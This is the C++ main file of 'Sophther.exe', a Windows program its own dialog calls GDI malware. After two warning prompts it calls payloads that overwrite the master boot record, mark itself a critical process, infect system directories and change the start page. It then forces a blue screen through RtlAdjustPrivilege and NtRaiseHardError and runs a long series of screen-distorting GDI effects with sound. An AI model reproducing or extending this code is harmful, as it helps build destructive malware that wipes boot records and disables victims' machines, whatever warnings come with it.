#include "Sophther.h"



INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int nCmdShow) {
	if (GetFileAttributesW(L"C:\\WINDOWS\\booto.dat") == INVALID_FILE_ATTRIBUTES) {
		LPCWSTR lpBody;
//		if (!System::ifWindowsXP()) lpBody = L"YOU ARE NOT RUNNING THIS ON WINDOWS XP!\n\nThis malware will not run properly.\nStill execute it?";
		lpBody = L"You have ran into a GDI malware that may potentially destroy your stuff.\nNotCCR and VenraTech are not responsible for any damage with this.\nThis has the ability to overwrite the MBR, set itself as a critical process and lay dormant in system directories.\n\nProceed to execute?";
		if (MessageBoxW(NULL, 
		lpBody,
		L"Sophther.exe by NotCCR + Venra",
		MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
		
		if (MessageBoxW(NULL,
		L"FINAL WARNING!!\n\nTHIS MALWARE SHOULD ONLY BE RUN ON A VM WHERE YOUR DATA SHOULD BE SAFE, AND WE ARE NOT RESPONSIBLE FOR ANY DAMAGE!\nEXECUTE IT?",
		L"Sophther.exe - You misread.",
		MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
	}
	Payloads::OverwriteMBR();
	Payloads::SetCritProcess();
	Payloads::InfectSystem();
	Payloads::StartPageChanger();
	SleepSec(5);
	MessageBoxW(NULL, L"This program does not support the version of Windows your computer is running.", GetDir(), MB_ICONERROR|MB_OK);
	SleepSec(5);
	 if (!CheckForWindowsXP()) {
		BYTE ntByte;
		DWORD dwRsp;
		RtlAdjustPrivilege(19, true, false, &ntByte);
		NtRaiseHardError(0xc000000b, 0, 0, 0, 6, &dwRsp);
	} 
	CreateThread(NULL, 0, Payloads::RandomTime, NULL, 0, 0);
	CreateThread(NULL, 0, Payloads::CursorPos, NULL, 0, 0);
	
	Bytebeat::Sound1();
	// SCREEN SHAKING //
	HANDLE hIM = CreateThread(NULL, 0, GDI::InitialMovement, NULL, 0, 0);
	SleepSec(10);
	
	// PIXELATION //
	HANDLE hPix = CreateThread(NULL, 0, GDI::Pixelation, NULL, 0, 0);
	SleepSec(10);
	
	// BRIGHT SCREEN MELTING //
	HANDLE hMel = CreateThread(NULL, 0, GDI::Melt, NULL, 0, 0);
	SleepSec(3);
	
	// SHELL32 ICON SPAM //
	HANDLE hS32I = CreateThread(NULL, 0, GDI::Shell32Icons, NULL, 0, 0);
	SleepSec(3);
	
	// BIT COLOURS //
	HANDLE hCN = CreateThread(NULL, 0, GDI::ColorNoise, NULL, 0, 0);
	SleepSec(4);
	
	// DLL TEXTOUTS //
	HANDLE hDLLTO = CreateThread(NULL, 0, GDI::DLLTextouts, NULL, 0, 0);
	SleepSec(10);
	
	EndHandle(hPix); EndHandle(hMel); EndHandle(hS32I); EndHandle(hDLLTO); EndHandle(hCN);
	Redraw();
	Sleep(10);
	
	Bytebeat::Sound2();
	
	// KALEIDOSCOPE //
	HANDLE hTCS = CreateThread(NULL, 0, GDI::TheCollidoscope, NULL, 0, 0);
	HANDLE hPS = CreateThread(NULL, 0, GDI::PatShake, NULL, 0, 0);
	SleepSec(30);
	EndHandle(hIM); EndHandle(hTCS); EndHandle(hPS);
	Redraw();
	Sleep(10);
	

//	if (!System::ifWindowsXP()) exit(0);
	Bytebeat::Sound3();
	
	// CUBE + PLASMA RGBQUAD //
	HANDLE hCurCube = CreateThread(NULL, 0, GDI::CursorCube3D, NULL, 0, 0);
	HANDLE hPRGB = CreateThread(NULL, 0, GDI::PlasmaRGB, NULL, 0, 0);
	SleepSec(30);
	
	EndHandle(hPRGB);
	Redraw();
	Sleep(10);
	
	
	// SCREEN BOUNCE //
	Bytebeat::Sound4();
	HANDLE hSB = CreateThread(NULL, 0, GDI::ScreenBounce, NULL, 0, 0);
	HANDLE hGray = CreateThread(NULL, 0, GDI::Grayscale, NULL, 0, 0);
	SleepSec(27);
	BYTE ntByte;
	RtlAdjustPrivilege(19, true, false, &ntByte);
//	InitiateSystemShutdownW(NULL, (WCHAR*)L"The system process \'C:\\WINDOWS\\system32\\lsass.exe\' terminated unexpectedly with status code 1. The system will now shut down and restart.", 90, false, true);
	
	EndHandle(hGray); EndHandle(hSB);
	Redraw();
	Sleep(10);
	
	
	// HSL ELLIPSES + SCREEN WARP //
	Bytebeat::Sound5();
	HANDLE hHSLC = CreateThread(NULL, 0, GDI::HSLCircles, NULL, 0, 0);
	HANDLE hSD = CreateThread(NULL, 0, GDI::ShakeDeform, NULL, 0, 0);
	SleepSec(30);
	
	EndHandle(hHSLC);
	Redraw();
	
	Bytebeat::Sound6();
	HANDLE hASR = CreateThread(NULL, 0, GDI::ANDStrRoto, NULL, 0, 0);
	HANDLE hHFA = CreateThread(NULL, 0, GDI::HftnAnd, NULL, 0, 0);
	HANDLE TCS = CreateThread(NULL, 0, GDI::TheCollidoscope, NULL, 0, 0);
	HANDLE PS = CreateThread(NULL, 0, GDI::PatShake, NULL, 0, 0);
	SleepSec(30);
	EndHandle(hSD); EndHandle(hASR); EndHandle(hHFA);
	EndHandle(TCS); EndHandle(PS); // Kill me
//	AbortSystemShutdownW(NULL);
// egg!
	
}
